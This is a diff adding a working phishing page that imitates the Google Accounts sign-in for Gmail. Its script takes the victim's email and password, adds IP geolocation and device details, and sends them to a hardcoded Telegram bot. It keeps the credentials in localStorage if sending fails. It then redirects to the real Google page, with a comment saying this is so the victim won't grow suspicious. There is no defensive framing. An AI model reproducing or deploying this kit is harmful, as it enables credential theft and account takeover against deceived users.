@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Roboto',Arial,sans-serif; }
+  body { background:#f0f4f9; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:15px; }
+  .card { background:#fff; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
+  .logo { text-align:center; margin-bottom:16px; }
+  .logo svg { width:48px; height:48px; }
+  h1 { text-align:center; font-size:24px; font-weight:400; color:#202124; margin-bottom:8px; }
+  .subtitle { text-align:center; font-size:16px; color:#5f6368; margin-bottom:32px; }
+  .input-group { position:relative; margin-bottom:20px; }
+  .input-group input { width:100%; padding:13px 15px; font-size:16px; border:1px solid #dadce0; border-radius:4px; outline:none; background:transparent; }
+  .input-group input:focus { border:2px solid #1a73e8; padding:12px 14px; }
+  .input-group label { position:absolute; left:12px; top:14px; font-size:16px; color:#5f6368; background:#fff; padding:0 4px; transition:0.2s; pointer-events:none; }
+  .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top:-8px; font-size:12px; color:#1a73e8; }
+  .input-group input:not(:focus):not(:placeholder-shown) + label { color:#5f6368; }
+  .forgot { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; display:inline-block; margin-bottom:36px; }
+  .forgot:hover { text-decoration:underline; }
+  .actions { display:flex; justify-content:space-between; align-items:center; }
+  .create { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; }
+  .create:hover { text-decoration:underline; }
+  .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; letter-spacing:0.25px; }
+  .btn:hover { background:#1557b0; box-shadow:0 1px 2px rgba(60,64,67,0.3); }
+  .btn:disabled { background:#ccc; cursor:not-allowed; }
+  .msg { text-align:center; font-size:13px; margin-top:15px; padding:10px; border-radius:4px; display:none; }
+  .msg.ok { display:block; background:#e6f4ea; color:#137333; }
+  .msg.err { display:block; background:#fce8e6; color:#c5221f; }
+  .footer { display:flex; justify-content:space-between; font-size:12px; color:#5f6368; margin-top:36px; }
+  .footer select { border:none; background:transparent; color:#5f6368; font-size:12px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+  </div>
+  <h1>Sign in</h1>
+  <div class="subtitle">to continue to Gmail</div>
+
+  <form id="phishForm" onsubmit="return capture(event)">
+    <div class="input-group">
+      <input type="email" id="email" placeholder=" " required autocomplete="username">
+      <label for="email">Email or phone</label>
+    </div>
+    <div class="input-group">
+      <input type="password" id="password" placeholder=" " required autocomplete="current-password">
+      <label for="password">Enter your password</label>
+    </div>
+    <a href="#" class="forgot">Forgot email?</a>
+    <div class="actions">
+      <a href="#" class="create">Create account</a>
+      <button type="submit" class="btn" id="submitBtn">Next</button>
+    </div>
+    <div class="msg" id="msg"></div>
+  </form>
+
+  <div class="footer">
+    <select><option>English (United States)</option></select>
+    <span>Help&nbsp;&nbsp;Privacy&nbsp;&nbsp;Terms</span>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// KONFIGURASI BOT TELEGRAM
+// ============================================================
+const BOT_TOKEN = '9180587721:AAHbkiDhn1pqHgrzI7z6t8qXC7xWgm3aJkE';
+const CHAT_ID   = '9226840096';
+// ============================================================
+
+// Kumpulin metadata buat memperkaya laporan
+function getMeta() {
+  return {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    lang: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || 'direct',
+    timestamp: new Date().toISOString()
+  };
+}
+
+// Kirim ke Telegram via Bot API
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: CHAT_ID,
+    text: text,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  };
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    return data.ok === true;
+  } catch(e) {
+    console.error('Telegram send error:', e);
+    return false;
+  }
+}
+
+function showMsg(text, type) {
+  const el = document.getElementById('msg');
+  el.textContent = text;
+  el.className = 'msg ' + type;
+}
+
+async function capture(event) {
+  event.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+  const btn = document.getElementById('submitBtn');
+
+  if (!email || !password) return false;
+
+  // Validasi email sederhana
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    showMsg('Enter a valid email', 'err');
+    return false;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+  showMsg('', '');
+
+  const meta = getMeta();
+  const ipInfo = await fetchIPInfo();
+
+  const report =
+    `<b>🔴 GMAIL CREDENTIAL CAPTURED</b>\n` +
+    `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+    `<b>📧 Email:</b> <code>${escapeHtml(email)}</code>\n` +
+    `<b>🔑 Password:</b> <code>${escapeHtml(password)}</code>\n` +
+    `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+    `<b>🌐 IP:</b> <code>${ipInfo.ip || 'unknown'}</code>\n` +
+    `<b>📍 Lokasi:</b> ${ipInfo.city || '?'}, ${ipInfo.region || '?'}, ${ipInfo.country || '?'}\n` +
+    `<b>🏢 ISP:</b> ${ipInfo.org || '?'}\n` +
+    `<b>🕒 Waktu:</b> ${meta.timestamp}\n` +
+    `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+    `<b>💻 Device:</b> ${escapeHtml(meta.platform)}\n` +
+    `<b>📱 UA:</b> <code>${escapeHtml(meta.ua.substring(0, 150))}</code>\n` +
+    `<b>🖥️ Screen:</b> ${meta.screen}\n` +
+    `<b>🌏 TZ:</b> ${meta.tz}\n` +
+    `<b>🔗 Referrer:</b> ${escapeHtml(meta.referrer)}`;
+
+  const ok = await sendToTelegram(report);
+
+  if (ok) {
+    showMsg('Verifying your account... please wait.', 'ok');
+    // Simulasi redirect ke Google asli biar korban nggak curiga
+    setTimeout(() => {
+      window.location.href = 'https://accounts.google.com/signin/v2/identifier';
+    }, 2500);
+  } else {
+    showMsg('Something went wrong. Try again.', 'err');
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    // Fallback: simpen ke localStorage biar nggak ilang
+    try {
+      const logs = JSON.parse(localStorage.getItem('_k') || '[]');
+      logs.push({ email, password, meta, ipInfo, ts: Date.now() });
+      localStorage.setItem('_k', JSON.stringify(logs));
+    } catch(e) {}
+  }
+
+  return false;
+}
+
+// IP lookup gratis buat perkaya laporan
+async function fetchIPInfo() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    return await res.json();
+  } catch(e) {
+    try {
+      const res2 = await fetch('https://ipinfo.io/json');
+      return await res2.json();
+    } catch(e2) {
+      return {};
+    }
+  }
+}
+
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+</script>
+</body>
+</html>
